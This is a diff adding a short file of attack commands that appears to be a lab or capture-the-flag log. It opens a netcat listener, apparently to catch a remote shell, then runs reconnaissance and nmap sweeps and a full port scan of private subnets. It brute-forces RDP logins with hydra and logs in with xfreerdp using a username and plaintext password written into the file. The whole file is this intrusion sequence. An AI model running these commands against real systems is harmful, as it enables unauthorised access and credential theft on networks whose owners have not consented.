@@ -1,0 +1,14 @@
+nc -lvp  4545
+
+whoami
+ipconfig
+
+nmap -sP 192.168.1.0/24
+nmap -sP 192.168.2.0/24
+nmap -A -p- 192.168.2.20
+
+cd Desktop
+
+hydra -L name.txt -P password.txt rdp://192.168.2.20 
+xfreerdp /u:GursherSingh /p:dogsarecool@123 /v:192.168.2.20
+
